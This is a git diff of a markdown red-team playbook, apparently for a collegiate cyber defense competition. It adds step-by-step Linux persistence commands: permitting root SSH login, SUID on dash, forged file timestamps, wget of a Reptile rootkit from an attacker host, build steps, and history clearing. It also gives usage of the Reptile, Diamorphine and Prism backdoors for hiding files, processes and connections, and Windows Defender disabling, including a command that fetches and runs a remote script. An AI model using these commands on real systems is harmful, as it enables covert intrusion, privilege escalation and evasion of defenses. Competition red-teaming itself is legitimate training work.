@@ -77,19 +77,24 @@ pagetitle: Red Teaming for CCDC
 
 **Linux:**
 - Todo:
+  - Create a big zipped folder containing all necessary files (attacker and client)
   - Write a persistence script that does the following
+    - Gets all relevant files from kali
     - Backdoors PAM and adds the master password
+    - Permits root login: `sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config && touch -d "May 26 2020" /etc/ssh/sshd_config`
     - Adds a sliver script somewhere in the system
-    - Runs prism (on startup perhaps)
+    - Add suid dash: `chmod u+s $(which dash) && touch -d "April 16 2018" $(which dash)`
+    - Runs prism (on startup)
     - Hides all of the above with a rootkit
-  - Investigate these methods: 
-    - TCP Wrapped Services: `echo 'ALL: ALL: spawn ({backdoor}) & :allow' >> /etc/hosts.allow)` (or `hosts.deny`)
-    - [Prism](https://github.com/andreafabrizi/prism) ICMP backdoor (connects out to host machine)
-    - https://github.com/milabs/awesome-linux-rootkits - list of rootkits
-      - https://github.com/carloslack/KoviD seems like a really solid candidate for hiding files, connections, and keylogging
-      - https://github.com/h3xduck/TripleCross this seems like a contender, except does support nearly as many linux kernels
-    - https://github.com/ait-aecid/caraxes/ - hides files, could we use this to hide an ssh key?
-    - https://github.com/draios/sysdig - `-c spy_users` can read every user command ran?
+      - If kernel 4 or below, use reptile:
+        - `wget {kali_IP}:{port}/reptile.tar.gz && tar -xvf reptile.tar.gz && cd Reptile-master`
+        - `apt install gcc make build-essential linux-headers-$(uname -r)`
+        - Default options seem good, so `sed -i 's/reptile/redteam/g' config/defconfig && make defconfig && make && make install`
+      - If kernel 5 or above, 
+      - Will need `sysctl kernel.ftrace_enabled=1` and also check if `make` and `gcc` exist
+        - We need to look into installing these (among other packages) by pointing the installation to our IP instead of the internet
+    - Clear history: ` history -c && rm -f $HISTFILE` 
+      - Having space is important, seems to prevent logging even on newer kernels
 - [PANIX](https://github.com/Aegrah/PANIX)
   - One-stop shop for a persistence script, this thing is NICE
     - `./panix.sh --suid --default` gives SUID to dash, python, and find
@@ -99,9 +104,40 @@ pagetitle: Red Teaming for CCDC
     - After specifying variables in C code itself, build with `gcc -DDETACH -DNORENAME -Wall -s -static -o {outfile} prism.c`
     - Run as root on victim, then to trigger do `sudo python2 sendPacket.py {target} {password_set} {attacker_IP} {attacker_port}`
   - This seems kinda cool, but wouldn't be anything special unless we could somehow hide the connection with a rootkit
-- [Kovid](https://github.com/carloslack/KoviD)
-  - By god what a beautiful piece of code
-  - Can get root as any process by running `kill -SIGCONT 666`
+- [Caraxes](https://github.com/ait-aecid/caraxes/)
+  - Seems to be pretty good for 5.14-6.11
+  - Will need to uncomment the `hide_module()` function
+  - This seems pretty good for hiding files - we can set the word to hide in `rootkit.h`
+- [TripleCross](https://github.com/h3xduck/TripleCross)
+  - Tested on 5.x kernels, so maybe a bit less reliable
+- [Reptile](https://web.archive.org/web/20250703011339/https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip)
+  - Absolutely nutty rootkit for 2.6.x, 3.x, or 4.x, seems to be the go-to
+    - Has persistent, detection evasion, a nice management interface
+  - Downloadable [here](https://web.archive.org/web/20240220194314/https://codeload.github.com/f0rb1dd3n/Reptile/zip/refs/heads/master)
+  - Wiki [here](https://web.archive.org/web/20201226000229/https://github.com/f0rb1dd3n/Reptile/wiki/Install)
+  - Config:
+    - In `config/defconfig`, then after configuring we run `make defconfig`
+  - Install:
+    - `apt install build-essential linux-headers-$(uname -r)`
+    - `make menuconfig`, `make`, and `make install`
+  - Usage:
+    - `/reptile/reptile_cmd {show/hide}` to show/hide all hidden files
+    - `/reptile/reptile_cmd root` to get root
+    - `/reptile/reptile_cmd {show/hide} {pid}` to show/hide processes
+    - `/reptile/reptile_cmd conn {IP} {show/hide}` to show/hide ICP/UDP connections
+    - Content between `#<reptile>` and `#</reptile>` will be hidden
+      - Can be toggled with `reptile_cmd file-tampering`
+      - Works with both adding users to `/etc/passwd` and cron jobs
+        - Actually, having some trouble getting it working with cron jobs
+      - However, ssh seems resistant. Can't seem to permit root logins with a hidden line or add an hidden authorized keys file
+    - Couldn't get kali-side build working, so we can use prism for the shell
+- [Diamorphine](https://github.com/m0nad/Diamorphine/tree/master)
+  - Very nice compatibility across versions, pretty simple rootkit
+  - Usage
+    - Hide/show rootkit with `kill -63 {any_pid}`
+    - Become root with `kill -64 {any_pid}`
+    - Hide process with `kill -31 {pid_to_hide}`
+    - Hide files by modifying `MAGIC_PREFIX` in `diamorphine.h`
 
 
 ## Domain Persistence
@@ -216,6 +252,9 @@ pagetitle: Red Teaming for CCDC
 **Defender**
 - If we're local admin, we can just add an exclusion:
   - `Add-MpPreference -ExclusionPath "{path_to_excluded_folder}"`
+- We can spoof another antivirus with DefendNot
+  - `& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "{custom_AV_name}"`
+  - This does give a red defender icon, however
 - Permanently disable with:
   - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
   - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
